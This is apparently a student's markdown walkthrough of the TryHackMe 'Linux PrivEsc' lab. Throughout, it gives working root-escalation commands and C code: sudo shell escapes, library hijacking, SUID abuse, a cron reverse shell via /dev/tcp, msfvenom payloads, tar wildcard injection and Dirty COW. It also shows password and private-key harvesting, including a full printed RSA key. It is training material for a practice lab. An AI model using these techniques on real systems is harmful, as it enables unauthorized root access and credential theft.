
THM: Linux PrivEsc
-------------------
-------------------

### Task2: Service Exploits: 

#### PrivEsc via: ***Mysql***

### Task3: Weak File Permissions - Readable /etc/shadow

### Task4: Weak File Permissions - Writable /etc/shadow

#### To generate sha-512 hashed password:
```
$ mkpasswd -m sha-512 <password>
```
OR,

#### 'openssl passwd' with no options, will produce original crypt(3)-compatible hash
```
$ openssl passwd <password>
```
### Task5:  Weak File Permissions - Writable /etc/passwd
#### Same, generate password:

#### To generate sha-512 hashed password:
```
$ mkpasswd -m sha-512 <password>
```
OR,

#### 'openssl passwd' with no options, will produce original crypt(3)-compatible hash
```
$ openssl passwd <password>
```
Either edit the **root** passwd or append the new password with new user account with **uid=0** at the bottom

### Task6:  Sudo - Shell Escape Sequences
#### We will use: [GTFOBins](https://gtfobins.github.io)
```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop  ------> 1.
    (root) NOPASSWD: /usr/bin/find  -----------------> 2.
    (root) NOPASSWD: /usr/bin/nano ----->  3. 
    (root) NOPASSWD: /usr/bin/vim ----------------> 4.
    (root) NOPASSWD: /usr/bin/man ------------> 5.
    (root) NOPASSWD: /usr/bin/awk --------------------> 6. 
    (root) NOPASSWD: /usr/bin/less ---------------> 7. 
    (root) NOPASSWD: /usr/bin/ftp -----> 8.
    (root) NOPASSWD: /usr/bin/nmap --------------> 9.
    (root) NOPASSWD: /usr/sbin/apache2 ----------------> 10.
    (root) NOPASSWD: /bin/more -------------> 11.

```
6. /usr/bin/awk   
```
$ sudo awk 'BEGIN {system("/bin/sh")}'

sh-4.1# groups
root
```
1. /usr/sbin/iftop
```
$ sudo iftop
!/bin/sh

sh-4.1# groups
root
```
2. /usr/bin/find
```
$ sudo find . -exec /bin/sh \; -quit

sh-4.1# groups
root
```
3. /usr/bin/nano
```
$ sudo nano
^R^X
reset; sh 1>&0 2>&0
```
4. /usr/bin/vim
```
$ sudo vim -c ':!/bin/sh'

sh-4.1# groups
root
```
OR,
```
$ sudo vim 

:!/bin/sh
sh-4.1# groups
root
```
5. /usr/bin/man
```
$ sudo man <anycommand>

!/bin/sh

sh-4.1# groups
root
```
7. /usr/bin/less
```
$ sudo less <any file>

!/bin/sh

sh-4.1# groups
root
```
8. /usr/bin/ftp
```
$ sudo ftp
ftp> !/bin/sh
sh-4.1# groups
root
```
9. /usr/bin/nmap
```
$ sudo nmap --interactive

Starting Nmap V. 5.00 ( http://nmap.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-4.1# groups
root
```
11. /bin/more
```
$ TERM= sudo more /etc/profile

# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "`id -u`" -eq 0 ]; then
  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
else
  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
fi
export PATH

if [ "$PS1" ]; then
  if [ "$BASH" ]; then
    # The file bash.bashrc already sets the default PS1.
    # PS1='\h:\w\$ '
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  else
    if [ "`id -u`" -eq 0 ]; then
      PS1='# '
    else
      PS1='$ '
    fi
!/bin/sh

sh-4.1# groups
root
```
Only with **/usr/sbin/apache2**, we can't escalate our privileges

### Task7:  Sudo - Environment Variables

**LD_PRELOAD** and **LD_LIBRARY_PATH** are both inherited from the user's environment.
* **LD_PRELOAD** loads a **shared object** before any others when a program is run.
* **LD_LIBRARY_PATH** provides a **list of directories where shared libraries are searched for first.**

```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
### Create a shared object:
```
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
In this step: We are directly converting **C file** to **shared obj** file (**without making obj file** in the middle)
```
step1: $ gcc -c -Wall -Werror -fpic foo.c
step2: $ gcc -shared -o libfoo.so foo.o
```
Run one of the programs you are allowed to run via sudo (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object
```
$ sudo LD_PRELOAD=/tmp/preload.so more

root@debian:/home/user# groups
root
```
#### We can use any other programs which are allowed (given in the output of sudo -l)

```
 $ cat tools/sudo/preload.c 

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");   ------->
	setresuid(0,0,0);         ------->
	system("/bin/bash -p");
}

 $ cat tools/sudo/library_path.c 
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");    ----->
	setresuid(0,0,0);               ----->    
	system("/bin/bash -p");
}

```
setsuid sets:

1. ruid : real user ID
2. euid : effective user ID
3. suid : set-user-ID 

#### Same thing for setguid
```
int setresuid(uid_t ruid, uid_t euid, uid_t suid);
int setresgid(gid_t rgid, gid_t egid, gid_t sgid);
```
Run **ldd** against the **apache2** program file to see which **shared libraries** are used by the program:
```
$ ldd /usr/sbin/apache2
```
Create a **shared object** with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
```
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Run **apache2** using **sudo**, while settings the **LD_LIBRARY_PATH** environment variable to **/tmp (where we output the compiled shared object)**:
```
$ sudo LD_LIBRARY_PATH=/tmp apache2
```
#### A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

#### Remember to exit out of the root shell before continuing!

### Now lets try renaming /tmp/libcrypt.so.1 to /tmp/libpcre.so.3 used by apache2 and re-run apache2 using sudo again and lets see if gives us the root shell.

```diff
$ ldd /usr/sbin/apache2

	linux-vdso.so.1 =>  (0x00007fffdc5a4000)
+ libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fbae5d1a000)
	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fbae5af6000)
	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fbae58bc000)
	libpthread.so.0 => /lib/libpthread.so.0 (0x00007fbae56a0000)
	libc.so.6 => /lib/libc.so.6 (0x00007fbae5334000)
	libuuid.so.1 => /lib/libuuid.so.1 (0x00007fbae512f000)
	librt.so.1 => /lib/librt.so.1 (0x00007fbae4f27000)
+ libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fbae4cf0000)
	libdl.so.2 => /lib/libdl.so.2 (0x00007fbae4aeb000)
	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fbae48c3000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fbae61d7000)

+ [+] MORE or less every shared library will work, but in some cases somw editing needed to be done in codes

+$ echo "void pcre_free(){}" >> tools/sudo/library_path.c   
$ cat tools/sudo/library_path.c 
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
+void pcre_free(){}

+$ gcc -o /tmp/libpcre.so.3 -shared -fPIC tools/sudo/library_path.c 
 $ sudo LD_LIBRARY_PATH=/tmp apache2

 root@debian:/home/user# groups
 root

```
It doesn't work, so we edited the /home/user/tools/sudo/library_path.c as shown above, so that we satisfy the compiler and it then works!

### Task8: Cron Jobs - File Permissions

#### View the contents of the system-wide crontab:

```diff
$ cat /etc/crontab

  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.

  SHELL=/bin/sh
  PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

  # m h dom mon dow user	command
  17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
  25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
+ * * * * * root overwrite.sh                      ---------> 1st cronjob
+ * * * * * root /usr/local/bin/compress.sh        -----> 2nd cronjob
```
```
$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 66 May 10 22:25 /usr/local/bin/overwrite.sh
```
Permissions are misconfigured....

We can manipulate the contents wihtin it to  privesc, but before that we have to know that what is the status(permission) of those 2 files.
```
$ locate overwrite.sh
/usr/local/bin/overwrite.sh
```
We got that overwrite.sh has **rw** perm for **others**
```
$ cat /usr/local/bin/overwrite.sh
#!/bin/bash

echo `date` > /tmp/useless

$ cat "bash -i >& /dev/tcp/{ip}/4444 0>&1" >> /usr/local/bin/overwrite.sh
```
#### Then set up a listener:
```
$ nc -nlvp 4444
```
#### Then we will get the shell

### Task9: Cron Jobs - PATH Environment Variable:

#### View the contents of the system-wide crontab:

```diff
$ cat /etc/crontab

  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.

  SHELL=/bin/sh
  PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

  # m h dom mon dow user	command
  17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
  25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
+ * * * * * root overwrite.sh                      ---------> 1st cronjob
+ * * * * * root /usr/local/bin/compress.sh        -----> 2nd cronjob
```
```
$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 66 May 10 22:25 /usr/local/bin/overwrite.sh
```
As Permissions are misconfigured....

We can again manipulate the overwrite.sh to turn the root

```diff
$ ls -l /bin/cp
-rwxr-xr-x 1 root root 118432 Apr 28  2010 /bin/cp

$ ls -l /bin/chmod
-rwxr-xr-x 1 root root 52192 Apr 28  2010 /bin/chmod

+ [+] All these are misconfigured ....., global users have execute (-x) permission
```
We can use this to elevate our priv.

```
$ cat /usr/local/bin/overwrite.sh

#!/bin/bash

cp /bin/bash /tmp/rootbash

chmod +xs /tmp/rootbash

```
We also have to make sure the file (/usr/local/bin/overwrite.sh) is executable...

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
## Task10: Cron Jobs - Wildcards

**Here what we will do is to take adv. of use of wildcards- actually we will make such filename which are similar to
the `flag command name` for `tar` command. And tar will think those filename as flag names but actually NOT ;)**

View the contents of the other cron job script:
```
cat /usr/local/bin/compress.sh
```
_Note that the tar command is being run with a wildcard (*) in your home directory._

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/).

Use msfvenom on your Kali box to generate a reverse shell ELF binary.
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.112.253 LPORT=4444 -f elf -o shell.elf
```
Transfer the shell.elf file to /home/user/ on the Debian VM and make it executable

Create these two files in /home/user:
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
```
nc -nvlp 4444
```
## Task11: SUID / SGID Executables - Known Exploits

Find all the SUID/SGID executables on the Debian VM:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!

Run the exploit script to gain a root shell:
```
/home/user/tools/suid/exim/cve-2016-1531.sh
```
## Task12: SUID / SGID Executables - Shared Object Injection:

### Step1: To find out the `SUID executable`
The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
```
$ ll /usr/local/bin/suid-so 
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
```
### Step2: Running `strace` on the file: 

Running strace on the file to search the output for `open/access calls and for "no such file" errors`:
```diff
$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```
#### NOTE:
The `executable` tried to open => /home/user/.config/libcalc.so, but it is ***missing!!!***
=> We can take this adv. to make our own `/home/user/.config/libcalc.so` to execute what we want --> `Shared Object Injection` :white_check_mark:

### Step3: Making directory and shared object
```
$ mkdir /home/user/.config
$ gcc -shared -fPIC -o /home/user/.config/libcalc.so <custom made up c code>
```
```c
//Custom c code used as shared object

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
### Step4: Now just execute the executable:
```
$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),
46(plugdev),1000(user)
```
-----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------
 CTF NOTE:
-----------------------------------------------------------------------------------------------------------------------------
#### When this command doesn't work:
```
$ find /usr/local/bin -type f -perm/4000 -exec ls -l {} \; 2>>/dev/null
```
Do this:
```
$ ls -l /usr/local/bin | grep -iE "ws|-s|s-" 

OR simply,

$ ls -l /usr/local/bin | grep -iE ws

-rwsr-sr-x 1 root staff 6883 May 14  2017 suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 suid-env2
-rwsr-sr-x 1 root staff 9861 May 14  2017 suid-so
```
> This is because not always SUID permission will be permitted to `owner` only, it can also be alloted to group or other users, then `-perm/4000` would not match the conditions.
-----------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------

## Task13: SUID / SGID Executables - Environment Variables:

### Step1: Dumping the permission of the environment variables

The `/usr/local/bin/suid-env` executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without ***specifying an absolute path***.

### Step2: execute the file:
```
[....] Starting web server: apache2httpd (pid 1614) already running
. ok
```
NOTE:
> It seems to be trying to start the apache2 webserver

### step3: Run strings on the file to look for strings of printable characters:
```
$ strings /usr/local/bin/suid-env
 
 X -- snip -- X
service apache2 start
```
> We would take adv. of not specifying the absolute path => we would make one of our own to exploit this vuln.

```c
// c code to be executed as binary by `/usr/local/bin/suid-env`

int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
### Step4: compile code:
```
$ gcc -o service /home/user/tools/suid/service.c
```
### Step5: Adding `pwd` to `PATH` and executing binary:
```
user@debian:~$ PATH=.:$PATH
user@debian:~$ /usr/local/bin/suid-env
root@debian:~#
```

## Task14: SUID / SGID Executables - Abusing Shell Features (#1):

### Applicable for Bash versions < 4.2-048

The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the `absolute path` of the `service` executable (/usr/sbin/service) to start the `apache2 webserver`.
```
$ strings /usr/local/bin/suid-env

            X --- snip --- X

service apache2 start

$ strings /usr/local/bin/suid-env2

            X --- snip --- X

/usr/sbin/service apache2 start     ---> Absolute path

```
So, here, what we will do is: we would change `/usr/sbin/service` to `/bin/bash -p` 
=> It can only be done in bash version [ **Bash versions < 4.2-048** ]
```
$ /bin/bash --version

GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)

                  X --- snip --- X
```
> In `Bash versions < 4.2-048`, it is possible to ***define shell functions with names that resemble file paths***, then ***export those functions*** so that they are ***used*** `instead of any actual executable` at that file path.

So, How can we do it? 

### Step1:
Is it like this??
```diff
$ $ /usr/sbin/service="/bin/bash -p"

- zsh: no such file or directory: /usr/sbin/service=/bin/bash -p
```
#### NOPE!!!

### ***Like this***:
```
$ function /usr/sbin/service { /bin/bash -p; }
```
> Defining shell function....

### Step2: 
***Exporting the created function*** to `avoid execution` of the `actual executable`
```
$ export -f /usr/sbin/service
```

Result:
```
$ /usr/local/bin/suid-env2

root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

root@debian:~# whoami
root

```

### Now, the `Question` comes:

1. `/bin/bash -p` --> what is `-p` ??  \
_---> Due to a reason related to_ `real userid` and `effective userid` ---> ***Learn more abt it***

2. `export -f` --> what is `-f` ?? 
```
-f -->  It must be used if the names refer to functions. 
        If -f is not used, the export will assume the names are variables.
```
see: [geeksforgeeks](https://www.geeksforgeeks.org/export-command-in-linux-with-examples/)


## Task15:  SUID / SGID Executables - Abusing Shell Features (#2)


### Applicable for Bash versions < 4.4

When in `debugging mode`, Bash uses the `environment variable PS4` to display an extra prompt for debugging statements.

Run the `/usr/local/bin/suid-env2` executable with `bash debugging enabled` and the `PS4 variable` set to an `embedded command` which creates an SUID version of /bin/bash:
### Step1:
```
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

### Step2:
```
$ /tmp/rootbash -p

rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),
30(dip),44(video),46(plugdev),1000(user)

rootbash-4.1# whoami
root
```
***Debugging mode in linux:***
see:
1. [YT](https://www.youtube.com/watch?v=S8MCP3CzaIY)
2. [Take Control of PS1, PS2, PS3, PS4](https://www.thegeekstuff.com/2008/09/bash-shell-take-control-of-ps1-ps2-ps3-ps4-and-prompt_command/)


## Task16: Passwords & Keys - History Files:

#### **If a user accidentally types their password on the _`command line`_ instead of _`into a password prompt`_, it may get _`recorded`_ in a history file.**

```
$ cat ~/.*history

ls -al
cat .bash_history 
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn 
ls
identify
```

Password --> `password123`
```
user@debian:~$ su root
Password: 

root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)

root@debian:/home/user# whoami
root
```

## Task17: Passwords & Keys - Config Files:

### NOTE:
> **Config files often contain `passwords` in plaintext or other reversible formats.**

```diff
$ cat ~/.*history

ls -al
cat .bash_history 
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
+ nano myvpn.ovpn 
ls
identify
```

Lets see the content of this config file:
```
user@debian:~$ cat /etc/openvpn/auth.txt 

root
password123
```


## Task18: Passwords & Keys - SSH Keys:

```
$ find / type -d  -name ".ssh"  2> /dev/null

/.ssh

user@debian:/.ssh$ ls
root_key

user@debian:/.ssh$ ls -l root_key 
-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key

user@debian:/.ssh$ cat root_key

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
-----END RSA PRIVATE KEY-----

user@debian:/.ssh$ chmod 600 root_key 
chmod: changing permissions of `root_key': Operation not permitted
```

So, we will copy it and paste in KALI(attacker VM) to save it as an `600` permission id and log in with ssh
```
$ vim key
$ chmod 600 key 
$ ssh -i key root@10.10.166.236

root@debian:~# whoami
root
```

## Task19: NFS:

see: [hackingarticles](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/)

NOTE: 
> Any executable made in 64 bit OS, can't not be executeded in 32bit metasploitable(or linux) target. We have to use
"`-m32`" option while compiling with gcc.
> see:[link](https://askubuntu.com/questions/184280/bash-filename-cannot-execute-binary-file)
> To practice these steps, we can do the same thing in `msfadmin user` just doing the same thing as done in kali(or attacler VM)

### For THM BOX:
> Method of **Mounting** filesystem share is different than those methods explained in `hackingarticles`. Those methods were not working.

This:
```
$ mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```
Then: Generating payload: (Bash option for priv esc was also not working, getting shared library missing error)
```
$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

$ chmod +xs /tmp/nfs/shell.elf

$ /tmp/shell.elf
```
#### What is the name of the option that disables root squashing?
> no_root_squash


## Task20:  Kernel Exploits:

### Kernel exploits can leave the system in an `unstable state`, which is why you should only run them as a `last resort`.

#### Step1: 
Used `Linux Exploit Suggester 2 tool` to identify potential kernel exploits on the current system.
```
$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w

$ ./c0w
```
#### Step2:
Once the exploit completes, run /usr/bin/passwd to gain a root shell:
```
$ /usr/bin/passwd
```

### NOTE:
Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
```
$ mv /tmp/bak /usr/bin/passwd
```

## Task21: Privilege Escalation Scripts:

Use: LinEnum.sh, linpeas.sh, lse.sh

